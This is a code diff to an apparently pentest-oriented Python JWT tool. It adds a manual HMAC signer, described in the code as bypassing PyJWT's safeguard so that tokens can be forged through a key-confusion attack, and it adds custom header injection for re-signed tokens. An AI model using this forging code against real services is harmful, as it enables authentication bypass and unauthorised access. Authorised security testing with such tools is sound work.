@@ -8,6 +8,8 @@ import jwt
 from cryptography.hazmat.primitives import serialization
 from cryptography.hazmat.primitives.asymmetric import rsa, ec
 from cryptography.hazmat.backends import default_backend
+import hmac
+import hashlib
 # from cryptography.utils import int_to_bytes, int_from_bytes # Removed, using built-ins
 
 # ==========================================
@@ -302,10 +304,52 @@ class TokenManager:
             else:
                 signing_key = key_content # HMAC secret
 
-            return jwt.encode(payload, signing_key, algorithm=alg, headers=headers)
+            # Debug
+            # print(f"DEBUG: alg={alg}, key_type={type(signing_key)}, headers={headers}", file=sys.stderr)
+
+            try:
+                return jwt.encode(payload, signing_key, algorithm=alg, headers=headers)
+            except Exception as e:
+                # PyJWT 2.0+ prevents using PEM keys for HMAC. We bypass this for pentesting (Key Confusion Attack).
+                if "asymmetric key" in str(e) and alg.startswith("HS"):
+                    print("Warning: PyJWT refused key. Falling back to manual signing for Key Confusion attack...", file=sys.stderr)
+                    return self._manual_sign(payload, alg, key_content, headers)
+                raise e
             
         except Exception as e:
             raise ValueError(f"Error signing token: {e}")
+
+    def _manual_sign(self, payload: Dict[str, Any], alg: str, key_bytes: bytes, headers: Optional[Dict[str, Any]] = None) -> str:
+        """
+        Manually signs a token to bypass library restrictions (e.g. using PEM for HMAC).
+        """
+        # 1. Prepare Header
+        header = headers.copy() if headers else {}
+        # header["typ"] = "JWT" # Removed to avoid forcing it if not present
+        header["alg"] = alg
+        
+        json_header = json.dumps(header, separators=(',', ':')).encode('utf-8')
+        b64_header = base64.urlsafe_b64encode(json_header).rstrip(b'=').decode('utf-8')
+        
+        # 2. Prepare Payload
+        json_payload = json.dumps(payload, separators=(',', ':')).encode('utf-8')
+        b64_payload = base64.urlsafe_b64encode(json_payload).rstrip(b'=').decode('utf-8')
+        
+        # 3. Sign
+        signing_input = f"{b64_header}.{b64_payload}".encode('utf-8')
+        
+        if alg == "HS256":
+            signature = hmac.new(key_bytes, signing_input, hashlib.sha256).digest()
+        elif alg == "HS384":
+            signature = hmac.new(key_bytes, signing_input, hashlib.sha384).digest()
+        elif alg == "HS512":
+            signature = hmac.new(key_bytes, signing_input, hashlib.sha512).digest()
+        else:
+            raise ValueError(f"Manual signing not implemented for algorithm: {alg}")
+            
+        b64_signature = base64.urlsafe_b64encode(signature).rstrip(b'=').decode('utf-8')
+        
+        return f"{b64_header}.{b64_payload}.{b64_signature}"
 
 
 # ==========================================
@@ -359,6 +403,7 @@ def main():
     parser_process.add_argument("--alg", help="Algorithm to resign with (HS256, RS256, none)")
     parser_process.add_argument("--sign-key", help="Key to resign with (PEM file or secret)")
     parser_process.add_argument("--output", choices=["json", "jwt"], default="json", help="Output format (default: json for decode, jwt for resign)")
+    parser_process.add_argument("--out", help="Output file path (optional)")
 
     # --- Key-Convert Sub-command ---
     parser_key = subparsers.add_parser("key-convert", help="Convert between JWK and PEM")
@@ -379,45 +424,59 @@ def main():
     if args.command == "process":
         tm = TokenManager()
         try:
+            # 0. Handle Input (File or String)
+            token_input = args.token
+            if os.path.exists(token_input):
+                with open(token_input, 'r') as f:
+                    token_input = f.read().strip()
+            
             # 1. Decode
-            payload = tm.decode_token(args.token, args.verify_key if not args.no_verify else None)
+            payload = tm.decode_token(token_input, args.verify_key if not args.no_verify else None)
+            original_headers = jwt.get_unverified_header(token_input)
             
             # 2. Modify Payload
             if args.set_claim:
                 payload = tm.modify_payload(payload, args.set_claim)
 
             # 3. Resign or Output
+            output_content = ""
             if args.alg:
-                # Prepare headers
-                headers = {}
-                # If we are resigning, we might want to preserve original headers or just use new ones.
-                # Usually resigning implies new headers (alg, typ).
-                # But if user wants to inject specific headers (like kid), we handle it here.
+                # Prepare headers - Start with original headers to preserve 'kid' etc.
+                headers = original_headers.copy()
                 
-                # Let's start with default headers for the alg (PyJWT handles alg/typ)
-                # But if we want to inject custom headers:
+                # Remove 'alg' and 'typ' from original to let resign_token/manual_sign handle them or overwrite them
+                headers.pop("alg", None)
+                headers.pop("typ", None)
+                
                 if args.set_header:
                     for h in args.set_header:
                         if "=" in h:
                             k, v = h.split("=", 1)
-                            # Try JSON parsing for value (e.g. for jwk object)
                             try:
                                 v = json.loads(v)
                             except json.JSONDecodeError:
-                                pass # Keep as string
+                                pass 
                             headers[k.strip()] = v
                 
                 new_token = tm.resign_token(payload, args.alg, args.sign_key, headers=headers if headers else None)
-                print(new_token)
+                output_content = new_token
             else:
                 if args.output == "json":
-                    print(json.dumps(payload, indent=2))
+                    output_content = json.dumps(payload, indent=2)
                 else:
                     if args.set_claim:
-                        print("Warning: Claims modified but no resigning requested. Outputting JSON payload.")
-                        print(json.dumps(payload, indent=2))
+                        print("Warning: Claims modified but no resigning requested. Outputting JSON payload.", file=sys.stderr)
+                        output_content = json.dumps(payload, indent=2)
                     else:
-                        print(args.token)
+                        output_content = token_input
+
+            # 4. Handle Output (File or Stdout)
+            if args.out:
+                with open(args.out, 'w') as f:
+                    f.write(output_content)
+                print(f"Output saved to {args.out}")
+            else:
+                print(output_content)
 
         except Exception as e:
             print(f"Error: {e}", file=sys.stderr)
